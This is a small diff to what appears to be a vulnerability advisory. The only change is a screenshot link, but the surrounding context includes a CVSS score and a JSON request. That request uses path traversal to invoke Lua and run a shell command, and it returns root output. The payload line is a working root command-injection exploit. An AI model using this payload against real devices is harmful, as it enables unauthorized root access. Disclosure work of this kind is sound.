@@ -42,7 +42,7 @@ CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H (6.8)
 
 {"cmd":"/lib/libnl/cli/cls/../../../../usr/bin/lua","param":"-e local f=io.popen(\"id\") print(f:read(\"*a\"))"} → output.cmdresult: uid=0(root) gid=0(root). Verified verbatim on 2026-10-13.
 
-PoC script: [poc.py](poc.py) - Screenshot: [screenshot.md](screenshot.md) (replace with screenshot.png)
+PoC script: [poc.py](poc.py) - Screenshot: [screenshot.png](screenshot.png)
 
 ### Description
 
